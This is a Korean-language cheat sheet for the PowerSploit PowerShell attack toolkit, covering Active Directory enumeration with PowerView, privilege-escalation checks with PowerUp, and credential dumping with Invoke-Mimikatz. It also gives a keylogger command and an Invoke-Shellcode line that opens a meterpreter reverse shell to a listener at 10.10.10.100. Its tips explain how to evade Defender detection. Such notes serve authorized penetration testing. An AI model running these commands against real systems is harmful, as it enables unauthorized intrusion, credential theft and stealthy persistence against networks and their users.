# PowerSploit

- PowerSploit — PowerShell 공격 스크립트 모음. Recon(PowerView)·Privesc(PowerUp)·Exfiltration(Invoke-Mimikatz)·Persistence·CodeExecution 등 기능별 폴더로 나뉜다.
- 도메인 열거(PowerView) → 권한상승 점검(PowerUp) → 크리덴셜 덤프(Invoke-Mimikatz)로 이어지는 Windows·AD 초기 흐름을 PowerShell에서 한 번에 갈 때.
- PowerShell, dot-source 또는 Import-Module로 스크립트 로드, 실행 정책 우회.

## 로드 방법

```powershell
. .\PowerSploit\Recon\PowerView.ps1
Import-Module .\PowerSploit\Privesc\PowerUp.ps1
Import-Module .\PowerSploit\Exfiltration\Invoke-Mimikatz.ps1
```

## 도메인 열거 (Recon - PowerView)

```powershell
Get-NetDomain
Get-NetUser | Select samaccountname
Get-NetGroup "Domain Admins" | Select member
Get-NetComputer
Get-NetGPO
Get-ObjectAcl -Identity <user> -ResolveGUIDs
Find-LocalAdminAccess
Invoke-UserHunter
```

- Get-NetDomain·Get-NetUser·Get-NetGroup·Get-NetComputer·Get-NetGPO: 도메인·유저·그룹·컴퓨터·GPO 열거.
- Get-ObjectAcl -ResolveGUIDs: ACL 열거로 GenericAll·ForceChangePassword 등 공격 경로 탐색.
- Find-LocalAdminAccess: 현재 계정이 로컬 관리자인 호스트 탐색.
- Invoke-UserHunter: 로그온 세션으로 특정 유저가 접속 중인 호스트 추적.

## 권한상승 점검 (Privesc - PowerUp)

```powershell
Invoke-AllChecks
Get-UnquotedService
Get-ModifiableServiceFile
```

- Invoke-AllChecks가 서비스 경로 인용 누락·수정 가능 파일·AlwaysInstallElevated 등을 한 번에 점검한다.

## 크리덴셜·기타 (Exfiltration 등)

```powershell
Invoke-Mimikatz -DumpCreds                 # lsass 덤프 기반 해시 수집
Get-Keystrokes                             # 키로깅
Out-Minidump                               # 프로세스 minidump 생성
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.10.10.100 -Lport 4444
```

- Exfiltration 폴더에는 Invoke-Mimikatz 외에 Get-TimedScreenshot, Out-Minidump 등이 있다.

## 팁·트러블슈팅

- 최신 PowerView(3.x) 계열은 Get-DomainUser·Find-LocalAdminAccess 같은 함수명으로 갈린다. 함수가 없으면 Get-Command로 존재 여부를 확인.
- Invoke-Mimikatz는 Defender에 잡힌다. lsass minidump를 만들어 오프라인으로 읽는 방식을 검토.
- 스크립트 전체가 탐지되면 필요한 함수만 잘라 단발로 쓴다.
- PowerView 열거는 LDAP 트래픽을 남긴다. 계정 읽기 권한이 있는지 먼저 확인.
- 도메인이 아니라 로컬만 보면 -Domain 또는 -Server 파라미터로 대상을 명시한다.
